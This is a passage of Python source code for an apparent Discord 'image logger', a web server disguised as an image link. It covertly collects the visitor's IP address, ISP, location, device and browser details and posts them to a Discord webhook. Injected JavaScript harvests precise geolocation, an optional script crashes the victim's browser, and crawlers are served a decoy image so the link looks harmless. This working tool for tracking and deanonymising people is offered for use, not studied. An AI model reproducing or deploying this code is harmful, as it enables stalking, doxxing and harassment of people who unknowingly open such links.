> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
